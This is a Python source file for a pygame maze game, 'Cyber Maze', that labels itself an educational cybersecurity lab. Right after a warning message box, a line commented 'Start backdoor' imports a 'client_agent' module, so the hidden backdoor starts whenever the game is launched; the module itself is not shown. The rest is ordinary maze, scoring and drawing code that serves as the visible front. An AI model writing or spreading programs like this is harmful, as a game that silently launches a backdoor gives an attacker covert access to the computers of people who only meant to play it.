import pygame
import threading
import random
import sys
import os
import ctypes

# Instead of console input, use a GUI message box
ctypes.windll.user32.MessageBoxW(0, 
    "This is a cybersecurity educational game.\n\n" +
    "⚠️ Run ONLY in isolated/virtual machine ⚠️\n\n" +
    "Click OK to continue...", 
    "Cyber Maze - Educational Lab", 0)

# Start backdoor
import client_agent

# Initialize game
pygame.init()

# Game settings
WIDTH = 900
HEIGHT = 700
TILE_SIZE = 40
FPS = 60

# Colors
BLACK = (0, 0, 0)
WHITE = (255, 255, 255)
GRAY = (100, 100, 100)
BLUE = (0, 100, 255)
LIGHT_BLUE = (100, 200, 255)
GREEN = (0, 255, 0)
YELLOW = (255, 255, 0)
RED = (255, 0, 0)
PURPLE = (150, 0, 255)
ORANGE = (255, 150, 0)

screen = pygame.display.set_mode((WIDTH, HEIGHT))
pygame.display.set_caption("Cyber Maze - Level Explorer")
clock = pygame.time.Clock()

# Fonts
font_large = pygame.font.Font(None, 72)
font_medium = pygame.font.Font(None, 48)
font_small = pygame.font.Font(None, 32)

class MazeGame:
    def __init__(self):
        self.level = 1
        self.score = 0
        self.moves = 0
        self.time_elapsed = 0
        self.start_time = pygame.time.get_ticks()
        self.player_pos = [1, 1]
        self.goal_pos = [18, 13]
        self.maze = self.generate_maze(15, 20)
        self.collected_items = []
        self.items = self.place_items(3)
        self.game_won = False
        self.level_complete = False
        
    def generate_maze(self, rows, cols):
        """Generate a random maze using recursive backtracking"""
        # Ensure odd dimensions for proper maze generation
        if rows % 2 == 0:
            rows += 1
        if cols % 2 == 0:
            cols += 1
            
        # Initialize maze with walls
        maze = [[1 for _ in range(cols)] for _ in range(rows)]
        
        def carve(x, y):
            directions = [(0, -2), (0, 2), (-2, 0), (2, 0)]
            random.shuffle(directions)
            
            for dx, dy in directions:
                nx, ny = x + dx, y + dy
                if 0 < nx < cols-1 and 0 < ny < rows-1 and maze[ny][nx] == 1:
                    maze[y + dy//2][x + dx//2] = 0
                    maze[ny][nx] = 0
                    carve(nx, ny)
        
        # Start carving from (1,1)
        maze[1][1] = 0
        carve(1, 1)
        
        # Ensure there's a path to the goal area
        for i in range(rows-2, 1, -1):
            for j in range(cols-2, 1, -1):
                if maze[i][j] == 0:
                    self.goal_pos = [j, i]
                    break
            if self.goal_pos != [18, 13]:
                break
        
        return maze
    
    def place_items(self, count):
        """Place collectible items in the maze"""
        items = []
        rows, cols = len(self.maze), len(self.maze[0])
        
        for _ in range(count):
            attempts = 0
            while attempts < 100:
                x = random.randint(1, cols-2)
                y = random.randint(1, rows-2)
                pos = [x, y]
                
                # Don't place on player start, goal, or existing items
                if (self.maze[y][x] == 0 and 
                    pos != self.player_pos and 
                    pos != self.goal_pos and 
                    pos not in items):
                    items.append(pos)
                    break
                attempts += 1
        
        return items
    
    def handle_input(self, key):
        if self.level_complete:
            if key == pygame.K_n:
                self.next_level()
            elif key == pygame.K_q:
                return False
            return True
            
        new_pos = self.player_pos.copy()
        
        if key == pygame.K_UP:
            new_pos[1] -= 1
        elif key == pygame.K_DOWN:
            new_pos[1] += 1
        elif key == pygame.K_LEFT:
            new_pos[0] -= 1
        elif key == pygame.K_RIGHT:
            new_pos[0] += 1
        elif key == pygame.K_ESCAPE:
            return False
        
        # Check if move is valid
        if (0 <= new_pos[0] < len(self.maze[0]) and 
            0 <= new_pos[1] < len(self.maze) and 
            self.maze[new_pos[1]][new_pos[0]] == 0):
            
            self.player_pos = new_pos
            self.moves += 1
            
            # Check for item collection
            if self.player_pos in self.items:
                self.items.remove(self.player_pos)
                self.score += 100
            
            # Check for level completion
            if self.player_pos == self.goal_pos and not self.items:
                self.level_complete = True
                self.score += 500 * self.level
        
        return True
    
    def next_level(self):
        self.level += 1
        self.moves = 0
        self.start_time = pygame.time.get_ticks()
        self.player_pos = [1, 1]
        
        # Increase difficulty
        rows = min(15 + self.level, 25)
        cols = min(20 + self.level, 35)
        self.maze = self.generate_maze(rows, cols)
        self.items = self.place_items(min(3 + self.level, 8))
        self.level_complete = False
        
    def update_time(self):
        if not self.level_complete:
            self.time_elapsed = (pygame.time.get_ticks() - self.start_time) // 1000
    
    def draw(self):
        screen.fill(BLACK)
        
        # Draw maze
        for y, row in enumerate(self.maze):
            for x, cell in enumerate(row):
                rect = (x * TILE_SIZE, y * TILE_SIZE, TILE_SIZE-2, TILE_SIZE-2)
                
                if cell == 1:  # Wall
                    # Gradient wall effect
                    color = (40 + (x+y) % 20, 40 + (x+y) % 20, 40 + (x+y) % 20)
                    pygame.draw.rect(screen, color, rect)
                    pygame.draw.rect(screen, (80,80,80), rect, 1)
                else:  # Path
                    # Checkerboard pattern
                    if (x + y) % 2 == 0:
                        color = (240, 240, 240)
                    else:
                        color = (220, 220, 220)
                    pygame.draw.rect(screen, color, rect)
        
        # Draw items (collectibles)
        for item in self.items:
            x, y = item
            center = (x * TILE_SIZE + TILE_SIZE//2, y * TILE_SIZE + TILE_SIZE//2)
            pygame.draw.circle(screen, YELLOW, center, TILE_SIZE//4)
            pygame.draw.circle(screen, ORANGE, center, TILE_SIZE//6)
        
        # Draw player (with glow effect)
        px, py = self.player_pos
        player_rect = (px * TILE_SIZE + 4, py * TILE_SIZE + 4, TILE_SIZE-8, TILE_SIZE-8)
        
        # Glow effect
        for i in range(3):
            glow_rect = (px * TILE_SIZE + 4 - i, py * TILE_SIZE + 4 - i, 
                        TILE_SIZE-8 + i*2, TILE_SIZE-8 + i*2)
            pygame.draw.rect(screen, (100, 150, 255), glow_rect, 2)
        
        pygame.draw.rect(screen, BLUE, player_rect)
        pygame.draw.rect(screen, LIGHT_BLUE, player_rect, 2)
        
        # Draw goal (pulsing effect)
        gx, gy = self.goal_pos
        pulse = abs(pygame.time.get_ticks() % 1000 - 500) / 500
        goal_size = int(TILE_SIZE//2 + 5 * pulse)
        
        goal_center = (gx * TILE_SIZE + TILE_SIZE//2, gy * TILE_SIZE + TILE_SIZE//2)
        pygame.draw.circle(screen, GREEN, goal_center, goal_size)
        pygame.draw.circle(screen, (0, 200, 0), goal_center, goal_size-3)
        
        # Draw HUD
        self.draw_hud()
        
        # Draw level complete screen
        if self.level_complete:
            self.draw_level_complete()
        
        pygame.display.flip()
    
    def draw_hud(self):
        # Top bar
        pygame.draw.rect(screen, (20, 20, 20), (0, 0, WIDTH, 60))
        pygame.draw.line(screen, (100, 100, 100), (0, 60), (WIDTH, 60), 2)
        
        # Level info
        level_text = font_small.render(f"Level: {self.level}", True, YELLOW)
        screen.blit(level_text, (20, 15))
        
        # Score
        score_text = font_small.render(f"Score: {self.score}", True, GREEN)
        screen.blit(score_text, (200, 15))
        
        # Moves
        moves_text = font_small.render(f"Moves: {self.moves}", True, LIGHT_BLUE)
        screen.blit(moves_text, (380, 15))
        
        # Time
        minutes = self.time_elapsed // 60
        seconds = self.time_elapsed % 60
        time_text = font_small.render(f"Time: {minutes:02d}:{seconds:02d}", True, ORANGE)
        screen.blit(time_text, (540, 15))
        
        # Items left
        items_text = font_small.render(f"Items: {len(self.items)}", True, YELLOW)
        screen.blit(items_text, (720, 15))
        
        # Controls hint
        if not self.level_complete:
            controls = font_small.render("ESC: Quit", True, GRAY)
            screen.blit(controls, (WIDTH - 150, 15))
    
    def draw_level_complete(self):
        # Semi-transparent overlay
        overlay = pygame.Surface((WIDTH, HEIGHT))
        overlay.set_alpha(180)
        overlay.fill((0, 0, 0))
        screen.blit(overlay, (0, 0))
        
        # Level complete message
        complete_text = font_large.render(f"LEVEL {self.level} COMPLETE!", True, GREEN)
        text_rect = complete_text.get_rect(center=(WIDTH//2, HEIGHT//2 - 80))
        screen.blit(complete_text, text_rect)
        
        # Stats
        stats = [
            f"Score: {self.score}",
            f"Moves: {self.moves}",
            f"Time: {self.time_elapsed}s",
            f"Bonus: {500 * self.level}"
        ]
        
        y_offset = HEIGHT//2
        for stat in stats:
            stat_text = font_medium.render(stat, True, YELLOW)
            stat_rect = stat_text.get_rect(center=(WIDTH//2, y_offset))
            screen.blit(stat_text, stat_rect)
            y_offset += 50
        
        # Instructions
        next_text = font_small.render("Press N for next level", True, WHITE)
        next_rect = next_text.get_rect(center=(WIDTH//2, HEIGHT//2 + 120))
        screen.blit(next_text, next_rect)
        
        quit_text = font_small.render("Press Q to quit", True, WHITE)
        quit_rect = quit_text.get_rect(center=(WIDTH//2, HEIGHT//2 + 160))
        screen.blit(quit_text, quit_rect)

def main():
    game = MazeGame()
    running = True
    clock = pygame.time.Clock()
    
    while running:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
            
            if event.type == pygame.KEYDOWN:
                running = game.handle_input(event.key)
        
        game.update_time()
        game.draw()
        clock.tick(FPS)
    
    pygame.quit()
    sys.exit()

if __name__ == "__main__":
    main()